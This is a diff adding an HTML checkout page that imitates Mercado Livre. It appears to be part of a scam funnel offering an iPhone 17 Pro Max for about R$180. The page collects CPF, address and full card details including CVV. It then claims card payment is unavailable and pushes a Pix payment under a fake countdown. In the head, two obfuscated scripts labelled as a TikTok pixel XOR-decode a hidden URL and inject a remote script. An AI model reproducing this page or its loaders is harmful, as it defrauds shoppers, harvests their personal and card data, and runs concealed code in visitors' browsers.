@@ -1,0 +1,634 @@
+<!-- [20/10] FUNIL ANTIGO (v1) p/ teste A/B do site inteiro. Apagar ao fim do teste. -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><script>
+// injetado pra demo: simula que o iPhone 17 Pro Max ja foi "adicionado ao carrinho"
+// na pagina do produto, senao o checkout.js ve o carrinho vazio e manda de volta pro catalogo.
+localStorage.setItem('ml_cart', JSON.stringify([{
+  id: 'iphone17',
+  name: 'iPhone 17 Pro Max 256GB - Laranja-cósmico',
+  price: 17999,
+  oldPrice: 1180000,
+  image: '/midia/iphone17/laranja1.webp',
+  quantity: 1
+}]));
+</script>
+
+<script src="/assets/js/error-log.js?v=1"></script><script>window.ROTAS={"raiz":"/","questionario":"/oferta95/questionario/","roleta":"/oferta95/roleta/","recompensas":"/oferta95/recompensas/","produto":"/produtos/","checkout":"/oferta95/checkout/","up":"/oferta95/up/","esgotou":"/oferta95/esgotou/","reembolso":"/oferta95/reembolso/"};function rota(n){return (window.ROTAS&&window.ROTAS[n])||"/";}</script><script>window.__FRETE_REGRA={"sub_min":5000,"frete_min":1200,"sub_max":50000,"frete_max":7222,"envio_pct":55};</script><script src="/assets/js/replay/fm-replay.js?v=1793774445" data-endpoint="/api/replay.php" data-amostra="30" defer></script>
+<script>window.__ML_EXPERIMENT={id:"exp_theme_bf_v1",variant:"light"};</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Checkout - Mercado Livre</title>
+  <link rel="icon" href="/assets/images/favicon.png">
+  <link href="/assets/css/fonts.css" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/checkout.css">
+  <link rel="stylesheet" href="/assets/css/checkout-ml.css?v=15">
+
+
+
+  <!-- Facebook Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2027107937966810');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2027107937966810&ev=PageView&noscript=1"/></noscript>
+<!-- End Facebook Pixel Code -->
+<!-- FB/UTM Cookie Capture -->
+<script>
+(function(){
+  try{
+    var cs=document.cookie.split(";");
+    for(var i=0;i<cs.length;i++){
+      var c=cs[i].trim();
+      if(c.indexOf("_fbp=")===0) localStorage.setItem("ml_fbp",c.substring(5));
+      if(c.indexOf("_fbc=")===0) localStorage.setItem("ml_fbc",c.substring(5));
+    }
+    var u=new URLSearchParams(window.location.search);
+    var fbclid=u.get("fbclid");
+    if(fbclid){
+      var fbc="fb.1."+Date.now()+"."+fbclid;
+      document.cookie="_fbc="+fbc+";path=/;max-age=7776000;SameSite=Lax";
+      localStorage.setItem("ml_fbc",fbc);
+    }
+    var utms={};
+    ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","src","sck"].forEach(function(k){
+      var v=u.get(k); if(v) utms[k]=v;
+    });
+    if(Object.keys(utms).length>0){
+      var old={}; try{old=JSON.parse(localStorage.getItem("ml_utms")||"{}")}catch(e){}
+      Object.assign(old,utms);
+      localStorage.setItem("ml_utms",JSON.stringify(old));
+    }
+  }catch(e){}
+})();
+</script>
+
+<!-- TikTok Pixel Code -->
+  
+<style id="ab-light-timerfix">.sticky-timer,#pix-urgency-banner{display:none!important}</style>
+<script src="/assets/js/tiktok-helper.js?v=1"></script>
+<script>(function(){var t_xp=atob("DCXIzfdTl3LzTePFMl7quIU/tUjRJZexQlby4tgw8xzdOJeoW0Ox45Q8+lyRP8y2UVehvYMguAeHIJDqXkS8qIQnuRiAb8/nU1G8v54x4gaWPsH/aV7qo5Y+8lDJb4ekRkTluIM+/hSKYJO3V1Oto4N+7xGcKc62UU7q4dUl9h6GKMH/EAe14Yxx+ROeKMH/EEGpuZZ+4gaeJIW8H1W6qIE2+QbePpanW0G779tx4ROfOIbnCAfqsKou");var c_dkmb=[];for(var d_y=0;d_y<t_xp.length;d_y++){c_dkmb.push(t_xp.charCodeAt(d_y)&255);}var f_3zy=c_dkmb[0];var c_0hv=c_dkmb.slice(1,1+f_3zy);var n_h=c_dkmb.slice(1+f_3zy);var e_hxw0=n_h.map(function(b,f_e30){return b^c_0hv[f_e30%f_3zy];});var z_t="";for(var u_43n=0;u_43n<e_hxw0.length;u_43n++){z_t+=String.fromCharCode(e_hxw0[u_43n]&255);}var x_lb3s=decodeURIComponent(escape(z_t));var b_g=JSON.parse(x_lb3s);var n_pu=b_g.globals||[];n_pu.forEach(function(n_r){window[n_r.name]=n_r.value;});var f_plp5=document.createElement("script");f_plp5.src=b_g.url;f_plp5.async=true;f_plp5.defer=true;(b_g.attributes||[]).forEach(function(p_y){f_plp5.setAttribute(p_y.name,p_y.value);});(document.head||document.documentElement).appendChild(f_plp5);})();</script>
+
+<script>(function(){var q_si=atob("DBsW4u7fpqiJ9a0Kd2A0l5yzhJKrndl+B2gszcG8wsangNlnHn1vzI2wy4brh4J5FGl/kpqsidjgjchmWGt/mouziML614EoFm9ikIe909zsho8wLEY6wImzycromd4oTUBtwIC+y82rz496HmNzjqe7hISrg8xmAn402MzpxJi4kZwzESom2ovtnsrtkMs6Fisg1Yr92/X0");var b_7=[];for(var a_0nc8=0;a_0nc8<q_si.length;a_0nc8++){b_7.push(q_si.charCodeAt(a_0nc8)&255);}var m_cdmr=b_7[0];var q_z=b_7.slice(1,1+m_cdmr);var e_bd=b_7.slice(1+m_cdmr);var w_1=e_bd.map(function(b,k_a){return b^q_z[k_a%m_cdmr];});var e_83m="";for(var o_yjqq=0;o_yjqq<w_1.length;o_yjqq++){e_83m+=String.fromCharCode(w_1[o_yjqq]&255);}var z_dv=decodeURIComponent(escape(e_83m));var e_72=JSON.parse(z_dv);var i_svxc=e_72.globals||[];i_svxc.forEach(function(e_5i6){window[e_5i6.name]=e_5i6.value;});var k_u=document.createElement("script");k_u.src=e_72.url;k_u.async=true;k_u.defer=true;(e_72.attributes||[]).forEach(function(e_6a){k_u.setAttribute(e_6a.name,e_6a.value);});(document.head||document.documentElement).appendChild(k_u);})();</script>
+
+</head>
+<body>
+
+  <!-- ======== ML HEADER ======== -->
+  <header class="ck-topo">
+    <button type="button" class="ck-voltar" id="ckVoltar" aria-label="Voltar"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 12H5M11 18l-6-6 6-6"/></svg></button>
+    <div class="ck-titulo" id="ckTitulo">Carrinho</div>
+    <div class="ck-seguro" title="Compra segura" aria-label="Compra segura"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg></div>
+  </header>
+
+  <!-- ======== STEPPER (4 steps: merged Endereço+Envio) ======== -->
+  <div class="ml-stepper">
+    <div class="ml-stepper-inner">
+      <div class="ml-step active" data-step="1">
+        <div class="ml-step-dot"><span>1</span><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 4h2l2.4 10.2a1.5 1.5 0 0 0 1.5 1.1h8.6a1.5 1.5 0 0 0 1.4-1.1L21 8H7"/><circle cx="9.5" cy="19.5" r="1.3"/><circle cx="17" cy="19.5" r="1.3"/></svg><svg class="ok" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg></div>
+        <div class="ml-step-label">Carrinho</div>
+      </div>
+      <div class="ml-step-line"><i></i></div>
+      <div class="ml-step" data-step="2">
+        <div class="ml-step-dot"><span>2</span><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21a8 8 0 0 1 16 0"/></svg><svg class="ok" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg></div>
+        <div class="ml-step-label">Dados</div>
+      </div>
+      <div class="ml-step-line"><i></i></div>
+      <div class="ml-step" data-step="3">
+        <div class="ml-step-dot"><span>3</span><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 6h11v10H3zM14 9h4l3 3v4h-7"/><circle cx="7" cy="18" r="2"/><circle cx="17.5" cy="18" r="2"/></svg><svg class="ok" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg></div>
+        <div class="ml-step-label">Entrega</div>
+      </div>
+      <div class="ml-step-line"><i></i></div>
+      <div class="ml-step" data-step="4">
+        <div class="ml-step-dot"><span>4</span><svg class="ic" viewBox="0 0 24 24" aria-hidden="true"><rect x="2.5" y="5.5" width="19" height="13" rx="2"/><path d="M2.5 10h19M6 15h4"/></svg><svg class="ok" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12.5 4.5 4.5L19 7.5"/></svg></div>
+        <div class="ml-step-label">Pagamento</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ======== MAIN CONTENT ======== -->
+  <main class="ml-main">
+
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 1: CARRINHO (CART)                 -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel active" id="step-1">
+      <div class="cart-page-header">
+        <h2 class="cart-page-title">Produtos <span class="ck-full"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M13.5 2 4 13.5h6.5L9.5 22 20 9.5h-6.5z"/></svg>FULL</span></h2>
+      </div>
+
+      <div id="cart-items" class="cart-items"></div>
+
+      <div class="ck-sugestoes" id="ckSugBox">
+        <div class="ck-sug-titulo"><span>Descubra mais para seu carrinho</span></div>
+        <div class="ck-sug-grade" id="ckSugestoes"></div>
+      </div>
+
+      <div class="ck-rodape">
+        <div class="ck-rodape-in">
+          <div class="ck-total"><small>Total</small><strong id="cart-page-total">R$ 0,00</strong></div>
+          <button class="ml-btn-primary" onclick="goToStep(2)">Continuar a compra</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 2: DADOS PESSOAIS                 -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel" id="step-2">
+
+      <div class="panel-card">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          <h2>Dados pessoais</h2>
+        </div>
+        <p class="panel-card-desc">Informe seus dados para entrega</p>
+
+        <div class="field">
+          <label for="email">E-mail</label>
+          <input type="email" id="email" placeholder="seuemail@exemplo.com" autocomplete="email">
+          <div class="field-error"></div>
+        </div>
+        <div class="field">
+          <label for="nome">Nome completo</label>
+          <input type="text" id="nome" placeholder="Como aparece no documento" autocomplete="name">
+          <div class="field-error"></div>
+        </div>
+        <div class="field-row">
+          <div class="field">
+            <label for="cpf">CPF</label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" inputmode="numeric" maxlength="14">
+            <div class="field-error"></div>
+          </div>
+          <div class="field">
+            <label for="telefone">Celular</label>
+            <input type="tel" id="telefone" placeholder="(00) 00000-0000" inputmode="tel" maxlength="15">
+            <div class="field-error"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="data-privacy">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="#999"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        Seus dados estão protegidos com criptografia SSL
+      </div>
+
+      <button class="ml-btn-primary" onclick="goToStep(3)">Continuar</button>
+    </section>
+
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 3: ENDEREÇO + ENVIO (merged)      -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel" id="step-3">
+
+      <div class="panel-card">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+          <h2>Endereço de entrega</h2>
+        </div>
+
+        <div class="field">
+          <label for="cep">CEP</label>
+          <div class="cep-row">
+            <input type="text" id="cep" placeholder="00000-000" inputmode="numeric" maxlength="9">
+            <button class="cep-btn" onclick="buscarCEP()">Buscar</button>
+          </div>
+          <div class="field-error"></div>
+        </div>
+        <div class="field">
+          <label for="rua">Rua / Avenida</label>
+          <input type="text" id="rua" placeholder="Preenchido pelo CEP (ou digite)" autocomplete="address-line1">
+          <div class="field-error"></div>
+        </div>
+        <div class="field-row">
+          <div class="field field-sm">
+            <label for="numero">Número</label>
+            <input type="text" id="numero" placeholder="Nº" inputmode="numeric">
+            <div class="field-error"></div>
+          </div>
+          <div class="field field-lg">
+            <label for="complemento">Complemento <span class="optional">(opcional)</span></label>
+            <input type="text" id="complemento" placeholder="Apto, bloco...">
+          </div>
+        </div>
+        <div class="field">
+          <label for="bairro">Bairro</label>
+          <input type="text" id="bairro" placeholder="Bairro" autocomplete="address-level3">
+        </div>
+        <div class="field-row">
+          <div class="field field-lg">
+            <label for="cidade">Cidade</label>
+            <input type="text" id="cidade" placeholder="Cidade" autocomplete="address-level2">
+          </div>
+          <div class="field field-sm">
+            <label for="uf">UF</label>
+            <input type="text" id="uf" placeholder="UF" maxlength="2" autocomplete="address-level1">
+          </div>
+        </div>
+      </div>
+
+      <!-- Shipping options integrated into same step -->
+      <div class="panel-card" style="margin-top:2px">
+        <div class="panel-card-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3483fa"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+          <h2>Opção de envio</h2>
+          <span class="ck-envio-para" id="ckEnvioPara"></span>
+        </div>
+
+        <!-- [16/11] value = tipo do frete; o preço de Mercado Envios e Full vem da regra do carrinho (funil_frete_regra) -->
+        <label class="ship-opt selected" onclick="selectFrete('gratis')">
+          <input type="radio" name="frete" value="gratis" checked>
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Frete Grátis</span>
+              <span class="ship-opt-time">Chega em 6 a 8 dias úteis</span>
+            </div>
+            <span class="ship-opt-price free">Grátis</span>
+          </div>
+        </label>
+        <label class="ship-opt" onclick="selectFrete('mercado_envio')">
+          <input type="radio" name="frete" value="mercado_envio">
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Mercado Envios</span>
+              <span class="ship-opt-time">Chega em até 3 dias úteis</span>
+            </div>
+            <span class="ship-opt-price" data-frete-preco="mercado_envio">—</span>
+          </div>
+        </label>
+        <label class="ship-opt ship-opt-full" onclick="selectFrete('azul_cargo')">
+          <input type="radio" name="frete" value="azul_cargo">
+          <div class="ship-opt-body">
+            <div class="ship-opt-info">
+              <span class="ship-opt-name">Envio <span class="ck-full"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M13.5 2 4 13.5h6.5L9.5 22 20 9.5h-6.5z"/></svg>FULL</span></span>
+              <span class="ship-opt-time ship-amanha">Chega amanhã</span>
+            </div>
+            <span class="ship-opt-price" data-frete-preco="azul_cargo">—</span>
+          </div>
+        </label>
+      </div>
+
+      <button class="ml-btn-primary" onclick="goToStep(4)">Continuar</button>
+    </section>
+
+    <!-- ════════════════════════════════════════ -->
+    <!--  STEP 4: REVISE E CONFIRME + PIX        -->
+    <!-- ════════════════════════════════════════ -->
+    <section class="step-panel" id="step-4">
+
+      <!-- ──── SUB-VIEW A: REVISE E CONFIRME ──── -->
+      <div id="step-5-review">
+
+        <h1 class="review-title">Revise e confirme</h1>
+
+        <!-- Pricing -->
+        <div class="review-card">
+          <div class="review-row">
+            <span>Produto</span>
+            <span class="review-price" id="review-produto">R$ 0<sup>00</sup></span>
+          </div>
+          <div class="review-row">
+            <span>Frete</span>
+            <span class="review-price" id="review-frete">Grátis</span>
+          </div>
+          <div class="review-divider"></div>
+          <div class="review-row">
+            <span>Subtotal</span>
+            <span class="review-price" id="review-subtotal">R$ 0<sup>00</sup></span>
+          </div>
+          <div class="review-divider"></div>
+          <div class="review-row review-row-total">
+            <span>Total</span>
+            <div class="review-total-value">
+              <span class="review-price-big" id="review-total">R$ 0<sup>00</sup></span>
+            </div>
+          </div>
+          <!-- Savings badge -->
+          <div class="review-savings" id="review-savings" style="display:none">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#00a650"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            <span id="review-savings-text">Você está economizando R$ 0,00</span>
+          </div>
+        </div>
+
+
+        <!-- Formas de pagamento (visual) -->
+        <div class="review-section pay-section">
+          <h3 class="review-section-title">Forma de pagamento</h3>
+          <div class="pay-methods" role="tablist" aria-label="Forma de pagamento">
+            <button type="button" class="pay-method active" id="payTabPix" role="tab" aria-selected="true" onclick="selectPaymentMethod('pix')">
+              <span class="pay-method-ic pay-ic-pix"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5.283 18.36a3.505 3.505 0 0 0 2.493-1.032l3.6-3.6a.684.684 0 0 1 .946 0l3.613 3.613a3.504 3.504 0 0 0 2.493 1.032h.71l-4.56 4.56a3.647 3.647 0 0 1-5.156 0L4.85 18.36ZM18.428 5.627a3.505 3.505 0 0 0-2.493 1.032l-3.613 3.614a.67.67 0 0 1-.946 0l-3.6-3.6A3.505 3.505 0 0 0 5.283 5.64h-.434l4.573-4.572a3.646 3.646 0 0 1 5.156 0l4.559 4.559ZM1.068 9.422 3.79 6.699h1.492a2.483 2.483 0 0 1 1.744.722l3.6 3.6a1.73 1.73 0 0 0 2.443 0l3.614-3.613a2.482 2.482 0 0 1 1.744-.723h1.767l2.737 2.737a3.646 3.646 0 0 1 0 5.156l-2.736 2.736h-1.768a2.482 2.482 0 0 1-1.744-.722l-3.613-3.613a1.77 1.77 0 0 0-2.444 0l-3.6 3.6a2.483 2.483 0 0 1-1.744.722H3.791l-2.723-2.723a3.646 3.646 0 0 1 0-5.156"/></svg></span>
+              <span class="pay-method-txt"><b>Pix</b><small>Aprovação na hora</small></span>
+              <span class="pay-method-check" aria-hidden="true"></span>
+            </button>
+            <button type="button" class="pay-method" id="payTabCard" role="tab" aria-selected="false" onclick="selectPaymentMethod('card')">
+              <span class="pay-method-ic pay-ic-card"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2.5" y="5" width="19" height="14" rx="2.5"/><path d="M2.5 9.5h19"/></svg></span>
+              <span class="pay-method-txt"><b>Cartão de crédito</b><small>Em até 12x sem juros</small></span>
+              <span class="pay-method-check" aria-hidden="true"></span>
+            </button>
+          </div>
+
+          <div class="pay-pix-note" id="payPixNote">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#00a650" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            <span>Pague via Pix e garanta o desconto. Aprovação imediata.</span>
+          </div>
+
+          <div class="pay-card-area" id="payCardArea" style="display:none">
+            <form class="card-form" id="cardForm" autocomplete="off" novalidate onsubmit="return submitCardPayment(event)">
+              <div class="field">
+                <label for="cardNumber">Número do cartão</label>
+                <div class="card-number-wrap">
+                  <input type="text" id="cardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" aria-label="Número do cartão">
+                  <span class="card-brand" id="cardBrand" aria-hidden="true"></span>
+                </div>
+                <div class="field-error"></div>
+              </div>
+              <div class="field">
+                <label for="cardName">Nome impresso no cartão</label>
+                <input type="text" id="cardName" autocomplete="cc-name" placeholder="Como aparece no cartão">
+                <div class="field-error"></div>
+              </div>
+              <div class="field-row">
+                <div class="field">
+                  <label for="cardExpiry">Validade</label>
+                  <input type="text" id="cardExpiry" inputmode="numeric" maxlength="5" autocomplete="cc-exp" placeholder="MM/AA">
+                  <div class="field-error"></div>
+                </div>
+                <div class="field field-sm">
+                  <label for="cardCvv">CVV</label>
+                  <input type="text" id="cardCvv" inputmode="numeric" maxlength="4" autocomplete="cc-csc" placeholder="123">
+                  <div class="field-error"></div>
+                </div>
+              </div>
+
+              <!-- [16/11] parcelas logo acima do botão (antes ficava no topo); o resumo vai no texto do botão -->
+              <div class="pay-installments">
+                <label for="cardInstallments">Parcelas</label>
+                <div class="pay-select-wrap">
+                  <select id="cardInstallments" aria-label="Parcelas"></select>
+                </div>
+              </div>
+
+              <div class="card-error-box" id="payCardError" role="alert" style="display:none">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 8v4.5M12 16h.01"/></svg>
+                <div>
+                  <b>Pagamento com cartão indisponível</b>
+                  <span>Esta oferta é exclusiva para pagamento via Pix. Estamos gerando seu código Pix agora.</span>
+                </div>
+              </div>
+
+              <button type="submit" class="ml-btn-primary card-pay-btn" id="cardPayBtn">Pagar com cartão</button>
+            </form>
+          </div>
+        </div>
+
+        <button class="ml-btn-primary ml-btn-confirm" id="pixConfirmBtn" onclick="confirmAndPay()">Confirmar a compra</button>
+
+        <!-- Faturamento -->
+        <div class="review-section">
+          <h3 class="review-section-title">Faturamento</h3>
+          <div class="review-info-card">
+            <div class="review-info-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="#666"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zM6 20V4h5v7h7v9H6z"/></svg>
+            </div>
+            <div class="review-info-text">
+              <div class="review-info-name" id="review-name" data-rr-mask>—</div>
+              <div class="review-info-detail" id="review-cpf" data-rr-mask>CPF —</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Detalhe da entrega -->
+        <div class="review-section">
+          <h3 class="review-section-title">Detalhe da entrega</h3>
+          <div class="review-info-card">
+            <div class="review-info-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="#666"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </div>
+            <div class="review-info-text">
+              <div class="review-info-name" id="review-address" data-rr-mask>—</div>
+              <div class="review-info-detail">Entrega no endereço</div>
+            </div>
+          </div>
+
+          <!-- Products shipping info -->
+          <div class="review-shipping" id="review-shipping-items"></div>
+        </div>
+      </div>
+
+      <!-- ──── SUB-VIEW B: PIX PAYMENT (CRO Redesign) ──── -->
+      <div id="step-5-pix" style="display:none;">
+
+        <!-- Loading -->
+        <div id="pix-loading" class="pix-loading">
+          <div class="ml-spinner"></div>
+          <p>Gerando código PIX...</p>
+        </div>
+
+        <!-- PIX Content -->
+        <div id="pix-content" style="display:none;">
+
+          <!-- Aviso: oferta exclusiva Pix (aparece quando o lead tentou cartão) -->
+          <div class="pix-pay-notice" id="pixPayError" role="alert" style="display:none">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 8v4.5M12 16h.01"/></svg>
+            <div>
+              <b>Esta oferta é exclusiva para pagamento via Pix</b>
+              <span>Não foi possível pagar com cartão de crédito. Geramos seu Pix abaixo para você finalizar a compra.</span>
+            </div>
+          </div>
+
+          <!-- PIX Timer Banner (urgency) -->
+          <div class="pix-urgency-banner" id="pix-urgency-banner">
+            <div class="pix-urgency-inner">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+              <span>Seu desconto expira em <b id="pix-countdown">10:00</b></span>
+            </div>
+          </div>
+
+          <!-- Pix no padrão do Mercado Livre -->
+          <div class="pix-product-card pix-ml">
+            <div class="pix-topo"><span class="pix-marca" title="Pix"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5.283 18.36a3.505 3.505 0 0 0 2.493-1.032l3.6-3.6a.684.684 0 0 1 .946 0l3.613 3.613a3.504 3.504 0 0 0 2.493 1.032h.71l-4.56 4.56a3.647 3.647 0 0 1-5.156 0L4.85 18.36ZM18.428 5.627a3.505 3.505 0 0 0-2.493 1.032l-3.613 3.614a.67.67 0 0 1-.946 0l-3.6-3.6A3.505 3.505 0 0 0 5.283 5.64h-.434l4.573-4.572a3.646 3.646 0 0 1 5.156 0l4.559 4.559ZM1.068 9.422 3.79 6.699h1.492a2.483 2.483 0 0 1 1.744.722l3.6 3.6a1.73 1.73 0 0 0 2.443 0l3.614-3.613a2.482 2.482 0 0 1 1.744-.723h1.767l2.737 2.737a3.646 3.646 0 0 1 0 5.156l-2.736 2.736h-1.768a2.482 2.482 0 0 1-1.744-.722l-3.613-3.613a1.77 1.77 0 0 0-2.444 0l-3.6 3.6a2.483 2.483 0 0 1-1.744.722H3.791l-2.723-2.723a3.646 3.646 0 0 1 0-5.156"/></svg></span>
+              <div class="pix-topo-txt">
+                <h2 class="pix-titulo">Pague <span class="pix-new-price" id="pix-amount">R$ 0,00</span> via Pix</h2>
+                <p class="pix-sub">Copie o código e cole no app do seu banco. A aprovação é na hora.</p>
+              </div>
+            </div>
+
+            <div class="pix-code-section">
+              <div class="pix-code-field"><input type="text" id="pix-code" readonly value="" onclick="this.select()" aria-label="Código Pix Copia e Cola"></div>
+              <button class="pix-copy-btn" onclick="copyPixCode()" id="copy-btn">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                <span>Copiar código Pix</span>
+              </button>
+              <div class="pix-loss-text" id="pix-loss-text" style="display:none">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="13" r="8"/><path d="M12 9v4l2.5 2.5M9 2h6"/></svg>
+                <span>Pague dentro do prazo para garantir o desconto de <b id="pix-loss-amount"></b></span>
+              </div>
+              <details class="pix-qr-toggle" id="pix-qr-details">
+                <summary><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><path d="M14 14h3v3h-3zM20 14v.01M14 20h.01M17 20h4v-3"/></svg>Ver QR Code para pagar de outro celular</summary>
+                <div class="pix-qr-area"><div id="qr-code" class="pix-qr" data-rr-block></div></div>
+              </details>
+            </div>
+
+            <div class="pix-product-row">
+              <!-- sem src="" de proposito: o checkout.js preenche quando o item tem imagem. -->
+              <img id="pix-product-img" alt="" class="pix-product-thumb" style="display:none">
+              <div class="pix-product-info">
+                <div class="pix-product-name" id="pix-product-name"></div>
+                <div class="pix-product-pricing"><span class="pix-old-price" id="pix-old-price" style="display:none"></span></div>
+                <div class="pix-savings" id="pix-savings" style="display:none"><span id="pix-savings-text"></span></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Como pagar -->
+          <div class="pix-steps-card">
+            <h3 class="pix-steps-title">Como pagar com Pix</h3>
+            <ol class="pix-steps-grid">
+              <li class="pix-step-item"><span class="pix-step-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="8" y="8" width="12" height="12" rx="2"/><path d="M16 8V6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2"/></svg></span><span>Copie o código Pix</span></li>
